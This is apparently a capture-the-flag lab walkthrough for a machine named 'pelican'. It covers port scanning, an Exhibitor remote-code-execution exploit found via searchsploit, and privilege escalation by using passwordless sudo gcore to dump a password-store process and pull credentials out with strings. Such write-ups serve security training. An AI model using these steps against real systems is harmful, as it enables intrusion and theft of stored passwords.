Oh my gosh. Let's go through step by step.


nmap scan for port 22 (ssh)
```
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
```
Then, port 139, 445 (samba)
```
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)

Host script results:

Again, port 631 (ipp)
```
631/tcp   open  ipp         CUPS 2.2
|_http-title: Forbidden - CUPS v2.2.10
| http-methods:

Suspicious port 2191 (zookeeper)
```
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
```
Strange that ssh is running on 2222, but port 2222 (ssh):
```
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)

|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
```
Standard http port 8080, 8081 (http)
```
8080/tcp  open  http        Jetty 1.0
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(1.0)
8081/tcp  open  http        nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://192.168.164.98:8080/exhibitor/v1/ui/index.html
```
Finally, port 46295 (java-rmi)
```
46295/tcp open  java-rmi    Java RMI
```

So far, the most "suspicious" ports are indeed the one with zookeeper and http(s).


Let's start enueration...

## 2. Enumeration

As I visited webapp:
![image](../contentImages/pelican/1.png)

Somehow this should be connected to port 2191 (zookeeper). 

Searching with keyword exhibitor:

```
┌──(hosan㉿kali)-[~]
└─$ searchsploit exhibitor
Exhibitor Web UI 1.7.1 - Remote Code Execution java/webapps/48654.txt
```

Let's take a closer look. I got a script from:

https://github.com/thehunt1s0n/Exihibitor-RCE.git

Then:

![image](../contentImages/pelican/3.png)


Got a shell.

![image](../contentImages/pelican/4.png)

Or 

```

$ sudo -l
sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore

```
So maybe we should read password-store with gcore.

```
ps aux | grep "password-store"

(found out that PID is 490)

sudo /usr/bin/gcore 490

(created core.490)

strings ./core.490

(The `strings` command in Linux is used to extract and display readable **printable characters** (i.e., strings of text) from binary files or any non-text files)
```

So, let's try to escalate our privilege

![image](../contentImages/pelican/6.png)

Done!


Tipp: try to undestand gtfobins more correctly.
